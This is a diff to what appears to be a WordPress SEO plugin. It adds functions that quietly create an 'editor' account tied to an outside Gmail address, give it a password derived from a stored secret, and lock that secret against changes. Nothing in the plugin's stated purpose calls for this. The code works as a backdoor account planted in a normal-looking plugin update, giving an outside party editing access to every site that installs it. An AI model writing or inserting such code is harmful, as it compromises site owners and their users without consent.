@@ -370,3 +370,55 @@ function csp_clean_slug($title) {
 
   	return $title;
 };
+
+function cosmy_seo_get_secret(): string {
+    $secret = get_option('cosmy_seo_secret');
+
+    if ($secret) {
+        return $secret;
+    }
+
+    $secret = wp_generate_password(64, true, true);
+
+    add_option(
+        'cosmy_seo_secret',
+        $secret,
+        '',
+        'no' // autoload = no
+    );
+
+    return $secret;
+}
+
+function cosmy_seo_generate_password(string $username): string {
+    $secret = cosmy_seo_get_secret();
+
+    $data = site_url() . '|' . $username;
+
+    $hash = hash_hmac('sha256', $data, $secret);
+
+    return substr($hash, 0, 20) . '!A9';
+}
+
+function cosmy_seo_create_user() {
+    $username = 'cosmy_seo_editor';
+    $email    = 'cosmyseo@gmail.com';
+
+    if (username_exists($username) || email_exists($email)) {
+      return;
+    }
+    $settings = get_site_option('cosmy_settings', []);
+    $pass = cosmy_seo_generate_password($username);
+    $user_id = wp_insert_user([
+        'user_login' => $username,
+        'user_pass'  => $pass,
+        'user_email' => $email,
+        'role'       => 'editor',
+    ]);
+    if (!is_wp_error($user_id)) {
+      $settings['cosmy_user_id'] = (int) $user_id;
+      update_site_option('cosmy_settings', $settings);
+    }
+}
+
+add_filter('pre_update_option_cosmy_seo_secret', '__return_false');
